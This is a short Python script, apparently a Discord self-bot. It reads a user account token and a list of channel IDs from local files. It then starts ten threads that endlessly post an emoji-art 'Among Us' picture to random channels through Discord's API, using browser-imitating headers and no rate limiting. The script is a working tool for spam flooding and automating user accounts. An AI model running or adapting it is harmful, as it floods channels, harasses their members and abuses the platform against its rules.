import requests,threading,random,json
from random import randint, choice

config = json.load(open('config.json'))
token = config.get('token')


def genAmongUs():
	color = f'{choice(["red","yellow","purple","brown","orange","green"])}_square'
	return f"""⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜
⬜⬜⬜⬛⬛⬛⬛⬛⬛⬛⬛⬛⬜⬜⬜
⬜⬜⬛:{color}::{color}::{color}::{color}::{color}::{color}::{color}::{color}::{color}:⬛⬜⬜
⬜⬜⬛:{color}::{color}::{color}::{color}:⬛⬛⬛⬛⬛⬛⬜⬜
⬜⬜⬛:{color}::{color}::{color}:⬛🟦🟦⬜⬜⬜⬜⬛⬜
⬜:{color}:⬛:{color}::{color}::{color}:⬛🟦🟦🟦🟦🟦🟦⬛⬜
⬜:{color}:⬛:{color}::{color}::{color}:⬛🟦🟦🟦🟦🟦🟦⬛⬜
⬜:{color}:⬛:{color}::{color}::{color}::{color}:⬛⬛⬛⬛⬛⬛⬜⬜
⬜:{color}:⬛:{color}::{color}::{color}::{color}::{color}::{color}::{color}::{color}::{color}:⬛⬜⬜
⬜⬜⬛:{color}::{color}::{color}::{color}::{color}::{color}::{color}::{color}::{color}:⬛⬜⬜
⬜⬜⬛:{color}::{color}::{color}::{color}::{color}::{color}::{color}::{color}::{color}:⬛⬜⬜
⬜⬜⬜⬛⬛⬛⬛⬛⬛⬛⬛⬛⬜⬜⬜
⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜"""

headers = {
  "Authorization": token,
  "accept-encoding": "gzip, deflate, br",
  "accept-language": "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7",
  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 OPR/81.0.4196.31"
}


def r():
    while True:
        channelid = random.choice(open('group_id.txt').readlines()).strip('\n')
        response = requests.post(f'https://discord.com/api/v9/channels/{channelid}/messages',  headers={'Authorization': token}, json = {"content": genAmongUs()})
        print(response.content)
        print(response)

th = 10
for i in range(th):
    t = threading.Thread(target=r)
    t.start()


